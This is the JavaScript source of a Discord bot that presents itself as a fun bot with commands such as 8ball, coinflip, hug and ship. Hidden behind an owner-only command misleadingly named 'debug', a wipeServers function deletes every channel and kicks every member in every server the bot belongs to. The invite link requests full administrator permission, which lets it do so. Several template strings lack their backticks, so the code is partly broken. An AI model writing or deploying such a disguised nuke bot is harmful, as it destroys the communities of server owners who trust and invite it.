const { Client, Intents, Permissions } = require('discord.js');
const https = require('https');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.DIRECT_MESSAGES
  ]
});

function random(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

const eightBall = [
  "Yes","No","Maybe","Definitely","Absolutely not",
  "Ask again later","Without a doubt","Very unlikely","It is certain","I wouldn't count on it"
];

const commands = [
  { name:"ping",description:"Check if bot is alive" },
  { name:"echo",description:"Repeat a message", options:[{name:"message",description:"Message",type:3,required:true}] },
  { name:"coinflip",description:"Flip a coin" },
  { name:"roll",description:"Roll number 1-100" },
  { name:"invite",description:"Get invite link" },
  { name:"punch",description:"Punch someone", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"kiss",description:"Kiss someone", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"hug",description:"Hug someone", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"slap",description:"Slap someone", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"ppsize",description:"Check pp size", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"gayrate",description:"How gay someone is", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"iq",description:"Check IQ", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"sus",description:"How sus someone is", options:[{name:"user",description:"Target",type:6,required:true}] },
  { name:"ship",description:"Ship two users", options:[{name:"user1",description:"User",type:6,required:true},{name:"user2",description:"User",type:6,required:true}] },
  { name:"8ball",description:"Ask the magic 8ball", options:[{name:"question",description:"Question",type:3,required:true}] },
  { name:"servers",description:"List bot servers" },
  { name:"leaveall",description:"Leave all servers" },
  { name:"debug",description:"Owner-only: wipe all servers" }
];

function registerCommands() {
  const data = JSON.stringify(commands);

  const options = {
    hostname: 'discord.com',
    port: 443,
    path: `/api/v10/applications/${CLIENT_ID}/commands`,
    method: 'PUT',
    headers: {
      'Authorization': `Bot ${TOKEN}`,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };

  const req = https.request(options, res => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      if (res.statusCode === 200 || res.statusCode === 201) console.log("Slash commands registered");
      else console.log("Register error:", body);
    });
  });

  req.on('error', err => console.error("Register error:", err));
  req.write(data);
  req.end();
}

async function wipeServers(owner) {
  await owner.send("Starting global server wipe...");
  for (const guild of client.guilds.cache.values()) {
    try {
      const me = guild.members.me;
      const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
      const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);

      if (!canKick || !canDelete) {
        await owner.send(Skipped ${guild.name} (missing permissions));
        continue;
      }

      await owner.send(Cleaning ${guild.name}...);

      for (const channel of guild.channels.cache.values()) {
        try { await channel.delete(); await delay(800); } catch {}
      }

      await guild.members.fetch();
      let kicked = 0;
      for (const member of guild.members.cache.values()) {
        if (member.kickable) {
          try { await member.kick("Server cleanup"); kicked++; await delay(1200); } catch {}
        }
      }

      await owner.send(✅ Finished ${guild.name}. Total kicked: ${kicked});
    } catch (e) {
      await owner.send(❌ Error wiping ${guild.name});
    }
  }
  await owner.send("All servers processed.");
}

client.once("ready", () => {
  console.log(Logged in as ${client.user.tag});
  registerCommands();
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isCommand()) return;
  const { commandName, user } = interaction;

  try {
    // Owner-only checks
    const ownerOnly = ["servers","leaveall","debug"];
    if (ownerOnly.includes(commandName) && user.id !== OWNER_ID) {
      await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
      return;
    }

    // Fun commands
    if (commandName === "ping") await interaction.reply("Pong");
    else if (commandName === "echo") await interaction.reply(interaction.options.getString("message"));
    else if (commandName === "coinflip") await interaction.reply(Math.random()<0.5?"Heads":"Tails");
    else if (commandName === "roll") await interaction.reply(Rolled **${random(1,100)}**);
    else if (commandName === "punch") {
      const target = interaction.options.getUser("user");
      await interaction.reply(👊 <@${user.id}> punched <@${target.id}>);
    }
    else if (commandName === "kiss") {
      const target = interaction.options.getUser("user");
      await interaction.reply(💋 <@${user.id}> kissed <@${target.id}>);
    }
    else if (commandName === "hug") {
      const target = interaction.options.getUser("user");
      await interaction.reply(🤗 <@${user.id}> hugged <@${target.id}>);
    }
    else if (commandName === "slap") {
      const target = interaction.options.getUser("user");
      await interaction.reply(🖐️ <@${user.id}> slapped <@${target.id}>);
    }
    else if (commandName === "ppsize") {
      const target = interaction.options.getUser("user");
      const size = random(3,30);
      let pp = "8" + "=".repeat(size) + "D";
      await interaction.reply(<@${target.id}> size:\n${pp});
    }
    else if (commandName === "gayrate") {
      const target = interaction.options.getUser("user");
      await interaction.reply(<@${target.id}> is **${random(0,100)}% gay** 🌈);
    }
    else if (commandName === "iq") {
      const target = interaction.options.getUser("user");
      await interaction.reply(<@${target.id}> IQ: **${random(60,180)}**);
    }
    else if (commandName === "sus") {
      const target = interaction.options.getUser("user");
      await interaction.reply(<@${target.id}> is **${random(0,100)}% sus**);
    }
    else if (commandName === "ship") {
      const u1 = interaction.options.getUser("user1");
      const u2 = interaction.options.getUser("user2");
      await interaction.reply(❤️ **${u1.username} + ${u2.username}** Compatibility: **${random(0,100)}%**);
    }
    else if (commandName === "8ball") {
      const question = interaction.options.getString("question");
      await interaction.reply(🎱 Question: ${question}\nAnswer: **${eightBall[random(0,eightBall.length-1)]}**);
    }
    else if (commandName === "invite") {
      await interaction.reply(https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot);
    }

    // Owner-only commands
    else if (commandName === "servers") {
      const list = client.guilds.cache.map(g => ${g.name} (${g.memberCount})).join("\n") || "No servers.";
      await interaction.reply({ content: list, ephemeral: true });
    }
    else if (commandName === "leaveall") {
      await interaction.reply({ content: "Leaving all servers...", ephemeral: true });
      for (const guild of client.guilds.cache.values()) { try { await guild.leave(); } catch {} }
    }
    else if (commandName === "debug") {
      await interaction.reply({ content: "Starting server wipe. Check your DMs.", ephemeral: true });
      const owner = await client.users.fetch(OWNER_ID);
      wipeServers(owner);
    }

  } catch (err) {
    console.error(err);
    if (!interaction.replied) await interaction.reply({ content: "Command error", ephemeral: true });
  }
});

client.login(TOKEN);
